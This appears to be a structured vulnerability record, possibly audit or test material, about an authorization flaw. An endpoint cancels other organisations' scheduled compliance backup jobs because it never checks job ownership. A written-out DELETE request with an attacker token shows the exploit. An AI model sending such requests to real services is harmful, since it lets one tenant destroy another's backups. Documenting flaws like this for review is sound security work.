diagnosis: The endpoint cancels scheduled Agenda jobs using jobId directly from the route parameters. It never verifies that the job belongs to req.user.organizationId, allowing any authenticated user to cancel critical automated compliance backup schedules of other organizations.
exploit_request:
DELETE /api/jobs/backup/65a9108f9021481023b09210 HTTP/1.1
Host: admin.cloudbackup.io
Authorization: Bearer <attacker_token>
